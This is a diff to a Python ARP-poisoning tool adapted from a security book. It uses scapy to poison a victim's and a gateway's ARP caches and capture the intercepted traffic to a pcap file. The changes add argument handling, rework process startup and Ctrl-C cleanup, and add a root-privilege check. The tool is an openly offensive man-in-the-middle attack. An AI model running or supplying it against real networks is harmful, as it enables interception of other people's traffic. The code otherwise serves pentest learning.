@@ -5,11 +5,11 @@ This is an arp poisoning tool from BHP book.
 
 Improvement done:
 - add argparse to manage arguments
-- add parmeter for output file
+- add parameter for output file
 - move output file default path to user home
 
 Improvement to do:
-- need to improve end after CTRL-C
+- display to improve
 """
 from multiprocessing import Process
 from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap
@@ -64,11 +64,11 @@ class Arper:
         print(f'\tGateway ({self.gateway} is at {self.gatewaymac}.')
         print(f'\tVictim ({self.victim}.')
         print('-'*30)
+        self.poison_thread = Process(target=self.poison)
+        self.sniff_thread = Process(target=self.sniff)
 
     def run(self):
-        self.poison_thread = Process(target=self.poison)
         self.poison_thread.start()
-        self.sniff_thread = Process(target=self.sniff)
         self.sniff_thread.start()
 
     def poison(self):
@@ -102,10 +102,10 @@ class Arper:
                 send(poison_victim)
                 send(poison_gateway)
             except KeyboardInterrupt:
+                print("Interruption requested by user.")
                 self.restore()
+                time.sleep(5)
                 exit(0)
-            else:
-                time.sleep(2)
 
     def sniff(self):
         time.sleep(5)
@@ -140,8 +140,12 @@ class Arper:
 
 def main():
     myArgs = manageArguments()
-    myArp = Arper(myArgs.victim, myArgs.gateway, myArgs.output, myArgs.nic, myArgs.count)
-    myArp.run()
+    try:
+        myArp = Arper(myArgs.victim, myArgs.gateway, myArgs.output, myArgs.nic, myArgs.count)
+        myArp.run()
+    except PermissionError:
+        print(f'We need root or administrator account on local machine to run this script!')
+        exit(1)
 
 
 if __name__ == '__main__':
